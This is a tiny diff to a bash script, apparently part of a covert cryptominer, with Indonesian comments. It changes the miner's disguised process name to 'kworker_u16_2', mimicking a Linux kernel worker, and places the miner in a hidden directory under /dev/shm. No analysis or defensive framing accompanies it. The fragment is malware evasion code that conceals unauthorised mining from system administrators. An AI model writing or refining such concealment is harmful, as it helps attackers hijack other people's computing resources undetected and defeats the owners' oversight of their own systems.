@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Nama proses penyamaran
-PROC_NAME="tobrut"
+PROC_NAME="kworker_u16_2"
 
 # Folder tersembunyi
 MINER_DIR="/dev/shm/.cache"
